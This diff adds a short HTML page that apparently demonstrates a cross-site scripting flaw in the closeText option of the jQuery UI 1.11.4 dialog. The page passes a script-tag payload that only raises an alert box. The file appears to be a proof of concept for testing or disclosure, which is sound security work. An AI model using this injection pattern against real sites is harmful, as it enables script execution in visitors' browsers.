@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>XSS in closeText option of component ui dialog</title>
+
+    <script src="https://code.jquery.com/jquery-2.1.4.js"></script>
+    <script src="https://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
+    <!--script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script-->
+    <link rel="stylesheet" type="text/css" href="http://code.jquery.com/ui/1.9.1/themes/base/
+jquery-ui.css">
+    <script>
+        $(document).ready(function () {
+            $('#dialog').dialog({ closeText: '<script>alert("XSS")<\/script>' });
+        });
+    </script>
+</head>
+<body>
+    <div id="dialog" title="Dialog Title">Content here!</div>
+</body>
+</html>
